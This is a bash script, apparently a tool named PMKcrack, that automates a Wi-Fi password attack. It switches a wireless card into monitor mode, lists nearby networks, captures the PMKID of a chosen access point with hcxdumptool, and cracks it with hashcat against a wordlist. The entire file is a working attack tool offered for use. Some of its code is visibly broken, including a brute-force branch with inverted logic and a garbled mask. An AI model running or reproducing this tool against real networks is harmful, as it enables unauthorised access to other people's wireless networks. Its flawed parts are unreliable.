#!/bin/bash
############################
######## value #############
Work_dir=`pwd`
tools_dir="$Work_dir/.."
config="$Work_dir/Bin/config"
dump_file="$Work_dir/Bin/DataDump"
bin="$Work_dir/Bin"
CSVDB=dump-01.csv
check_folder_bin=`find  -name Bin -type d | grep -w "./Bin"`
if [ "$check_folder_bin" = "./Bin" ]; then
	echo ""
else
	mkdir -p Bin
fi
rm $bin/* > /dev/null 2>&1
touch $config
#############################
######## Color ##############
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[93m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'
############################
######## language ##########
source $Work_dir/../../../config/config-language
if [ "$language" = "VN" ]; then
source $Work_dir/../../../language/VietNamese/VN
elif [ "$language" = "EN" ]; then
source $Work_dir/../../../language/English/EN
fi
############################
####### function ###########
function banner {
echo -e "		   ${RESET}╔──────────────────────────────────────────────────────╗"
echo -e "		   |     ${white} ____  __  __ _  __${red}                    _    	${RESET}  |"
echo -e "		   |	 ${white}|  _ \|  \/  | |/ /${red} ___ _ __ __ _  ___| | __	${RESET}  |	"
echo -e "		   | 	 ${white}| |_) | |\/| | ' /${red} / __| '__/ _"'`'" |/ __| |/ /	${RESET}  |"
echo -e "		   | 	 ${white}|  __/| |  | | . \ ${red} (__| | | (_| | (__|   < ${RESET}	  |"	
echo -e "		   | 	 ${white}|_|   |_|  |_|_|\_\ ${red}___|_|  \__,_|\___|_|\_\ ${RESET}    |"
echo -e "		   |							  |"
echo -e "		   ╚──────────────────────────────────────────────────────╝		"
echo -e "		                                            				"
echo -e "		                                            				"

}
function checktools {
	clear
	sleep 0.5
	banner
	cd $tools_dir
	check_hcxtools_tool=`hcxpcaptool --version | grep hcxpcaptool`
	if [ "$check_hcxtools_tool" != "" ]; then
		echo -e "[ ✔ ]   hcxtools ${white}   .......... ${yellow}$Installed ${RESET}"
		check1="1"
	else    echo -e "[ ! ]   hcxtools ${white}   .......... ${red}$NotInstalled ${RESET}"
		check1="0"	
	fi
	check_hcxdumptool_tool=`hcxdumptool --version | grep hcxdumptool`
	if [ "$check_hcxdumptool_tool" != "" ]; then
		echo -e "[ ✔ ]   hcxdumptool ${white}.......... ${yellow}$Installed ${RESET}"
		check2="1"
	else    echo -e "[ ! ]   hcxdumptool ${white}.......... ${red}$NotInstalled ${RESET}"
		check2="0"	
	fi
	check_hashcat_tool=`find  -name hashcat -type d | grep -w "./hashcat"`
	if ! [[ -f /usr/bin/hashcat ]] && [[ "$check_hashcat_tool" != "./hashcat" ]]; then
                echo -e "[ ! ]   hashcat ${white}    .......... ${red}$NotInstalled ${RESET}"	
		check3="0"  
	else
		echo -e "[ ✔ ]   hashcat ${white}    .......... ${yellow}$Installed ${RESET}"
		check3="1"
        fi	
	sleep 1.5
}
function choose_hardware {
	cd $Work_dir
	clear
	sleep 0.5
	banner
	if [[ $check1 == "1" ]] && [[ $check2 == "1" ]] && [[ $check3 == "1" ]]; then
		iwconfig 2>&1 | grep -w "ESSID" | awk '{print "		"NR ": "$1}'
		iwconfig 2>&1 | grep -w "ESSID" | awk '{print "interface" NR "=" $1}' >> $config
		num=`wc $config | cut -d' ' -f2`
		iwconfig 2>&1 | grep -w "Monitor" | awk '{print "		"NR+'$num' ": "$1}'
		iwconfig 2>&1 | grep -w "Monitor" | awk '{print "interface" NR+'$num' "=" $1}' >> $config
		echo ""
		source $config
		echo -ne "- $input_interface"
		read value
		case $value in
			1) INTERFACE=$interface1;;
			2) INTERFACE=$interface2;;
			3) INTERFACE=$interface3;;
			4) INTERFACE=$interface4;;
			5) INTERFACE=$interface5;;
			6) INTERFACE=$interface6;;
			7) INTERFACE=$interface7;;
			8) INTERFACE=$interface8;;
			9) INTERFACE=$interface9;;
			10) INTERFACE=$interface10;;
			*) INTERFACE=""
		esac
	else 	
		echo -e $install_mess
		exit	
	fi
}
function check_hardware {
   if [ -e "/sys/class/net/$INTERFACE/device/driver" ]
   then
       DRIVER="`ls -l "/sys/class/net/$INTERFACE/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`"
       BUS="`ls -l "/sys/class/net/$INTERFACE/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)\/.*\/.*$/\1/'`"
   else
       DRIVER=""
       BUS=""
   fi
	
}
function action {
	clear
	banner
	echo -e "		${RESET}[ ${red}1 ${RESET}] $capturing"
	echo -e "		${RESET}[ ${red}2 ${RESET}] $exit_choose"
	while true; do 
	echo -ne "- $input_choose"
	read value
	case $value in
		1)
		airmon-ng start $INTERFACE > /dev/null
		airmon-ng check kill > /dev/null
		check_mon=`echo $INTERFACE | grep "mon"`
		if [ "$check_mon" != "" ]; then
			INTERFACE_monitor=$INTERFACE >> $config
		else
			INTERFACE_monitor=$INTERFACE"mon" >> $config
		fi
		xterm -title "Capturing data" -bg "#000000" -fg "#008000" -e airodump-ng $INTERFACE_monitor -w $bin/dump

		LINEAS_WIFIS_CSV=`find -name dump-01.csv` > /dev/null
		if [ "$LINEAS_WIFIS_CSV" == "" ];then
			echo ""
		        echo -e ""$red"["$yellow"!"$red"]"$transparent" $hardware_error "
			sleep 2
			exit
		fi

		dump_line=`cat $bin/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
		dump_line=`expr $dump_line - 1`
		head -n $dump_line $bin/$CSVDB &> $bin/dump-02.csv
		clear
		banner
		sleep 0.5
		echo "                        WIFI LIST "
		echo ""
		echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
		echo ""
		i=0
		while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
		        longueur=${#MAC}
		        PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		        PRIVACY=${PRIVACY:0:4}
		        if [ $longueur -ge 17 ]; then  
				i=$(($i+1))
				POWER=`expr $POWER + 100`
				echo -e " "$red"["$yellow"$i"$red"]"$white"\t""$red"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
		                aidlength=$IDLENGTH
		                assid[$i]=$ESSID
		                achannel[$i]=$CHANNEL
		                amac[$i]=$MAC
		                aprivacy[$i]=$PRIVACY
		                aspeed[$i]=$SPEED
		        fi           
		        done < $bin/dump-02.csv
		cat $bin/dump-02.csv | awk '{print $1}' > $bin/all_mac.csv
		tail -n +3 $bin/all_mac.csv | awk '{print "bssid" NR "=" $1}'> $bin/mac_dump.csv
		#linenum=`cat mac_dump.csv | wc -l mac_dump.csv | awk '{ print $1 }'`
		echo ""
		echo -ne "- $input_choose"
		read args		
		MAC=`grep -w "bssid$args" $bin/mac_dump.csv | cut -d'=' -f2 | cut -d',' -f1` > /dev/null
		echo $MAC | sed -e "s/://g" > $bin/MAC
		capturing;;
		2) function_exit;;
		*) echo -e "$error1";
	esac
	done	

}
function capturing {
	sleep 1
	clear
	banner
	xterm -title "Capturing PMKID" -bg "#000000" -fg "#008000" -e hcxdumptool -o $bin/hash -i $INTERFACE_monitor --filterlist=$bin/MAC --filtermode=2 --enable_status=3
	
	check_pmkid=`hcxpcaptool -z $bin/hashcrack $bin/hash | grep -w "PMKID(s)" | awk '{print $2}'`
	clear
	banner
	echo -e "		${RESET}[ ${red}1 ${RESET}] $pmkid_check"
	echo -e "		${RESET}[ ${red}2 ${RESET}] $return_choose"
	echo -e "		${RESET}[ ${red}3 ${RESET}] $exit_choose"
	while true; do
	echo -ne "- $input_choose"
	read args
	case $args in
		1)
			if [[ $check_pmkid == "" ]]; then
				clear
				banner
				echo -e "		${red} $not_found"
				sleep 1
				clear
				banner
				echo -e "		${RESET}[ ${red}1 ${RESET}] $return_capture"
				echo -e "		${RESET}[ ${red}2 ${RESET}] $capture_another_wifi"
				echo -e "		${RESET}[ ${red}3 ${RESET}] $exit_choose"

					while true; do
					echo -ne "- $input_choose"
					read choose
					case $choose in
						1)
						rm $bin/hash
						sleep 2
						clear
						banner
						capturing;;
						2)
						rm $bin/*
						sleep 2
						clear
						banner
						action;;
						3)
						function_exit;;
						*) 
						echo "		$error1";;
					esac
					done
			elif [[ $check_pmkid == "PMKID(s)" ]]; then 
				banner
				crack_hash
			fi;action;;
		2)	action;;
		3)	function_exit;;
		*)	echo "		$error1";;
	esac
	done
}
function crack_hash {
	function dictionary {
		echo -e "		${RESET}[ ${red}1 ${RESET}] $input_dic"
		echo -e "		${RESET}[ ${red}2 ${RESET}] $cre_dic"
		while true; do
		echo -ne "- $input_choose"
		read args
		case $args in
			1) 
				echo -ne "$path_dic"
				read file_dic
				if [[ -f /usr/bin/hashcat ]]; then
					hashcat -m 16800 $bin/hashcrack $file_dic --force
				elif [[ -f /usr/bin/hashcat ]]; then
					echo $not_yet_developed	
				fi;;
			2) echo $not_yet_developed;;
			*)	echo "		$error1";;
		esac
		done
	}
	function brute {
		if ! [[ -f /usr/bin/hashcat ]]; then
			hashcat -m 16800 hashcrack -a -w 3 '?l?l?l?ltled@whoami.info' --force
		fi
	}
	clear
	banner
	echo -e "		${RESET}[ ${red}1 ${RESET}] $dictionary"
	echo -e "		${RESET}[ ${red}2 ${RESET}] $brute"
	echo -e "		${RESET}[ ${red}3 ${RESET}] $return_choose"
	echo -ne "- $input_choose"
	read args
	while true; do
	case $args in
		1) dictionary;;
		2) #brute;;
			echo $not_yet_developed;;
		3) break;;
		*) echo "		$error1;"
	esac
	done
}
function function_exit {
rm $bin/* > /dev/null 2>&1
airmon-ng stop $INTERFACE_monitor > /dev/null 2>&1
service network-manager restart
exit
}
checktools
choose_hardware
check_hardware
action
